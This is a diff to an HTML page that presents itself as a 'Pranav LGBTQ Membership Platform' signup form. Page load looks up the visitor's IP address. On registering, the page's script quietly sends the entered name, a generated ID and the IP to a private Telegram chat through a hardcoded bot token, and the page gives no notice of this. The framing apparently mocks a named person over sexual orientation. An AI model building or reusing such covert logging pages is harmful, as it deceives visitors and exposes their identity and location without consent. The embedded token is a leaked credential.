@@ -1,11 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Register Name</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-</head>
-<body class="bg-gradient-to-r from-green-400 to-blue-500 min-h-screen flex items-center justify-center text-white">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Register Name</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 
-  printf "Working Soon"
+    <style>
+    .text-gradient {
+      background: linear-gradient(90deg, #f43f5e, #facc15, #3b82f6);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shine 3s infinite linear;
+    }
+
+    @keyframes shine {
+      0% { background-position: 0% }
+      100% { background-position: 200% }
+    }
+
+    .fade-in {
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+
+<body class="min-h-screen bg-gradient-to-r from-red-500 via-yellow-400 to-blue-500 flex items-center justify-center">
+
+   <audio id="successAudio" src="https://ik.imagekit.io/vf1giv8l7/kundan.mp3?updatedAt=1751460391365"></audio>
+
+  <div class="bg-white/30 backdrop-blur-md p-10 rounded-xl shadow-xl text-center text-white">
+    <h1 class="text-4xl font-bold mb-6 text-white drop-shadow-xl"> Pranav LGBTQ Membership Platform</h1>
+
+    <input type="text" id="nameInput" placeholder="Type your name..." class="text-black px-4 py-2 rounded-lg w-64 text-lg"/>
+    <br><br>
+
+    <button onclick="registerName()" class="bg-white text-green-700 px-6 py-2 rounded-full text-xl font-semibold hover:bg-green-200 transition">
+      Register
+    </button>
+
+    <div id="banner" class="mt-8 text-2xl font-bold hidden"></div>
+    <div id="userCode" class="mt-2 text-white-300 text-lg font-mono hidden"></div>
+    <div id="ipDisplay" class="mt-4 text-white text-sm"></div>
+
+    <img id="customImage" src="https://ik.imagekit.io/vf1giv8l7/png.jpg?updatedAt=1751460390677" alt="Registered" class="mt-6 w-56 h-auto mx-auto hidden rounded-xl shadow-lg border-4 border-white"/>
+  </div>
+
+  <script>
+    let userIP = "";
+
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.ip;
+        document.getElementById('ipDisplay').textContent = `🌐 Your IP: ${userIP}`;
+      });
+
+    function registerName() {
+      const name = document.getElementById('nameInput').value.trim();
+      if (!name) return alert("Please enter your name.");
+
+      const userCode = "USER-" + Math.floor(1000 + Math.random() * 9000);
+      document.getElementById('banner').textContent =  `✅ Hey "${name}" Your name has been registered successfully in our Membership !`;
+      document.getElementById('banner').classList.remove("hidden");
+
+      document.getElementById('userCode').textContent = `🆔 Your Membership ID: ${userCode}`;
+      document.getElementById('userCode').classList.remove("hidden");
+
+      document.getElementById('customImage').classList.remove("hidden");
+      document.getElementById('successAudio').play();
+
+      // Send directly to Telegram (⚠️ visible token!)
+      const botToken = '7782267173:AAGXZFGRJEMZLJzQqyhYLM1fdoJRbE8KKJs';
+      const chatId = '1289498754';
+      const message = `📝 New Registration:\n👤 Name: ${name}\n🆔 Code: ${userCode}\n🌐 IP: ${userIP}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => response.json())
+        .then(data => {
+          console.log('Telegram response:', data);
+        });
+    }
+  </script>
+</body>
+</html>
